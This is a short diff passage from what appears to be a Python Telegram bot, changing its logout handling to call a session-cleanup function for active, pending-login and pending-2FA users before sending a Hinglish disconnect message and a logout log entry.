-        except Exception:
-            pass
-        del active_clients[user_id]
+    if user_id in active_clients or user_id in pending_logins or user_id in pending_2fa_set:
+        await cleanup_user_session(user_id)
         await event.reply("✅ **ꜱᴇꜱꜱɪᴏɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴅɪꜱᴄᴏɴɴᴇᴄᴛ ʜᴏ ɢᴀʏᴀ ʜᴀɪ.**")
         await send_log(
             f"🔴 **#LOGOUT**\n"
